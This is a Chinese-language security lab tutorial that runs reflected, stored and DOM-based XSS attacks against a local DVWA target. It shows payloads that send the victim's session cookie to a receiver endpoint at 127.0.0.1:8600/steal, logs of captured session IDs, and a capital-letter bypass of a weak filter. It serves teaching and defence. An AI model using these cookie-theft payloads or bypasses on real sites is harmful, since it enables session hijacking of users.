# 14 · XSS 三种类型实战：反射、存储、DOM 与 cookie 窃取闭环

> XSS（跨站脚本：攻击者的 JS 在别人浏览器里以受害者身份运行）常年位居
> OWASP Top 10（Web 应用十大风险榜单）。本实验给三兄弟各做一次真实攻击：
> payload（构造的攻击代码）注入 DVWA（本地靶场）→ headless 浏览器（无界面
> 的自动化浏览器）扮演已登录受害者访问 → 自建接收端收到会话 cookie 明文；
> 最后再用大小写变换绕过 medium 档过滤。所有攻击只打本实验的本地靶场。

## Background

网页会把用户输入拼进 HTML 再发给浏览器。转义（把 `<` 写成 `&lt;` 之类
的实体）本该在每个输出点发生——漏掉一处，输入里的 `<script>` 就成了页面
的一部分，浏览器会当作作者写的代码执行。

三种类型的区别在「payload 存在哪、谁把它带进页面」：

- **反射**：payload 在 URL 里，服务器把它原样回显进响应——要诱导受害者点链接；
- **存储**：payload 进数据库（留言板/评论），渲染时拼进页面——谁看谁中招，无需诱导；
- **DOM**（Document Object Model：浏览器里的页面对象树）：服务器不处理它，客户端 JS 自己把 URL 参数写进页面。

危害为什么高：页面里的 JS 能读 `document.cookie`（未设 HttpOnly 时）、能
代表用户发请求、能改写页面——等于把「已登录的你」借给攻击者用。

## What

一句话定义：XSS 是**诱导浏览器把攻击者的输入当代码执行**——防线在输出点，不在输入点。

心智模型：页面是一面留言墙，转义 = 「访客只准写内容」；XSS = 有人在墙上
留了条暗语，浏览器读到后照着去做了。

三型对比（本实验都会实测）：

| 类型 | 注入点 | 触发条件 | 服务端可见性 |
|:---|:---|:---|:---|
| 反射 | URL 参数 | 受害者点开链接 | 回显在响应里 |
| 存储 | 数据库 | 任何访客打开页面 | 渲染进页面 |
| DOM | URL 参数 | 客户端 JS 执行时 | 不处理也不回显 |

失效边界：三道锁彼此独立——输出编码（根上修）、HttpOnly（cookie 上的
「禁止 JS 读取」标记）、CSP（内容安全策略：限制脚本执行与外连）。只上一
道是工程妥协，不是安全。

## When to Use

典型场景：授权渗透中证明漏洞影响（cookie 窃取是教科书级证据）；代码审计
时定位未转义输出与危险 sink（把数据写进页面的接收点）；给实验 19 的日志
审计造一批真实攻击流量。

何时不用：未授权目标不碰；别对生产乱扫——存储型 payload 会写脏数据。

| 方案 | 机制 | 什么时候选它 |
|:---|:---|:---|
| 手工 payload（本实验） | 自己构造最小验证 | 看清原理、精确证明影响 |
| 扫描器（XSStrike 等） | 自动 fuzz（变形输入轰炸） | 面广量大时的初筛 |
| 静态扫描（SAST） | 读源码找未转义输出点 | 左移（把安全提前到开发阶段）修复 |

## Quick Start

前置：实验 12 的 DVWA 栈（本脚本自动拉起）；Python 的 `flask`（轻量 Web
框架）+ `requests`；node + puppeteer-core（驱动 headless Chrome 的 Node
库，用技能自带的 node_modules）。

```bash
cd network/14_xss
./xss_lab.sh            # 起靶场 → 四种攻击 → 清理产物（约 40 秒）
./xss_lab.sh apply      # 只拉起靶场 + 接收端 + 登录取会话
./xss_lab.sh observe    # 只跑四种攻击
./xss_lab.sh clean      # 只停接收端并清 artifacts（靶场留给后续实验）
```

默认运行的真实输出（节选）：

```text
... # 输出首行空行省略
=====> [apply] 拉起 DVWA + 启动窃取接收端 + 登录取会话
... # 「初始化数据库」段头与其下「✅ 数据库已建好」一行省略（段内空行省略，下同）
  ✅ 窃取接收端就绪：http://127.0.0.1:8600/steal
  ✅ DVWA 会话就绪（cookie 已存 artifacts/cookie.txt，将喂给受害浏览器）

=====> [observe] ① 反射型 XSS（low）：payload 原样回显 + 受害浏览器触发
[reflect] payload（low）：<script>new Image().src='http://127.0.0.1:8600/steal?c='+encodeURIComp…
[reflect] 服务端原样回显：是
... # 受害 URL 与 visited 两行（超长 URL）省略
  ✅ 反射 payload 在受害浏览器中执行，接收端拿到 cookie（第 1 条回调）

=====> [observe] ② 存储型 XSS（low）：留言板投毒，访客自动中标
[stored] payload 已提交（101 字符，绕过表单 maxlength）
[stored] 留言板页面含未转义 payload：是
... # 受害 URL 与 visited 行省略
  ✅ 存储 payload 随页面加载执行（第 2 条回调）——这是「主动拜访」变「被动中招」

=====> [observe] ③ DOM 型 XSS（low）：payload 不经服务端处理，由客户端 JS 执行
[dom] payload 在 URL 参数里，服务端不处理它（encodeURI 式编码）
... # 超长受害 URL 与 visited 行省略
  ✅ 客户端 JS 把 URL 参数写进页面并执行（第 3 条回调）——服务端响应体里没有 payload，响应检测器看不见

=====> [observe] ④ medium 绕过：大小写变换让 str_replace 过滤失效
[reflect] payload（medium）：<Script>new Image().src='http://127.0.0.1:8600/steal?c='+encodeURIComp…
... # 回显「是」与两行超长 URL 省略
  ✅ medium 的 str_replace 只认小写 <script>——<Script> 绕过并执行成功（第 4 条回调）

=====> [observe] ⑤ 汇总：四次攻击共 4 条回调（每一条都含会话 cookie）
[captures] 共 4 条回调：
  01:27:38	127.0.0.1	http://127.0.0.1:8612/	PHPSESSID=70ij26ek9ujl3j7kjtrstn4931; security=low
  01:27:45	127.0.0.1	http://127.0.0.1:8612/	PHPSESSID=70ij26ek9ujl3j7kjtrstn4931; security=low
  01:27:50	127.0.0.1	http://127.0.0.1:8612/	PHPSESSID=70ij26ek9ujl3j7kjtrstn4931; security=low
  01:27:56	127.0.0.1	http://127.0.0.1:8612/	PHPSESSID=inkag0g7gsijoj3irq6d2hnsiu; security=medium
... # 「期望 ≥4 条：满足」与汇总 ✅ 行、clean 段省略
```

诚实预期（新手第一个失败点）：① 接收端只负责记录落盘，没收到回调
=payload 没执行成功，别先怀疑接收端；② DOM 型的编码有讲究，全量 URL
编码会把 payload 弄坏（见踩坑清单）；③ headless 不弹 `alert` 也没人
点「确定」，要靠「外带」cookie 验证。

## How It Works

![XSS 三种类型的攻击链路](images/xss_lab.svg)

> 怎么看：三行是三种 XSS 的完整链路（注入点 → 执行时机 → 战果），三条线
> 都汇到同一个接收端 `/steal`（图上标注「实测 4/4」）；最右一列是修复——
> 输出编码 + CSP + HttpOnly 把「执行」与「外带」一起封死。

> 🌐 **交互版**：本地打开 [`images/xss_lab.html`](images/xss_lab.html)。

**反射与存储的链路**：脚本带一次性 CSRF token（防跨站请求伪造）登录
靶场，把 payload 塞进 URL 参数和留言板 POST——直接提交 101 字符。
puppeteer 带会话 cookie 访问受害 URL，页面渲染时 `<script>` 执行，把
`document.cookie` 外带。

**接收端与受害者浏览器**：接收端是个不到 50 行的 flask 应用，把每次回调
的「时间 / 来源 IP / Referer（从哪跳来）/ cookie」追加进
`artifacts/receiver.log`；puppeteer 每次以新访客身份打开受害 URL，等 2 秒
（给 JS 执行与外带的窗口）再退出。

**DOM 型链路**：页面 JS 从 URL 里截出 `default=` 之后的内容，经 `decodeURI`
（URL 解码函数）后由 `document.write` 写进页面——浏览器渲染这段输出时把
payload 当代码执行；服务端从头到尾没碰过它。

**medium 绕过**：medium 档的过滤是 `str_replace`（PHP 替换函数）删掉小写
`<script>`——`<Script>` 原样穿过。受害者的档位也要跟着切到 medium：
`security` 值在 cookie 里，服务端按它选过滤分支。

## Pitfalls & Q&A

踩坑清单（现象 → 原因 → 解法）：

- **DOM 型 payload 执行坏**：sink 是 `decodeURI`，它不解码保留字符
  （`;/?:@&=+$,#`）——`encodeURIComponent` 全编码会被「留成」坏 payload；
  要用 encodeURI 式编码（保留这些字符，见 `xss_lab.py` 的 `safe=`）。
- **headless 里 alert 没反应**：无人点「确定」，页面 JS 卡在弹窗上——改用
  「外带」验证。
- **存储型被 `maxlength` 拦住**：它只是前端属性——脚本 POST 直接越过。

深入问答：

- **Q: HttpOnly 之后 XSS 就没危害了？** A: 远不止 cookie——能冒用身份发
  请求、窃取页面里的 CSRF token、改写页面钓鱼、探测内网。
- **Q: 为什么 DOM 型最难检测？** A: payload 不在服务端响应里，响应扫描
  看不见；要么动态执行，要么审 JS 里的危险 sink（`document.write` 等）。
- **Q: 修复该改输入还是输出？** A: 输出——medium 的黑名单 `str_replace`
  就在输入侧做，一个大小写就绕过去了，这是反面教材。
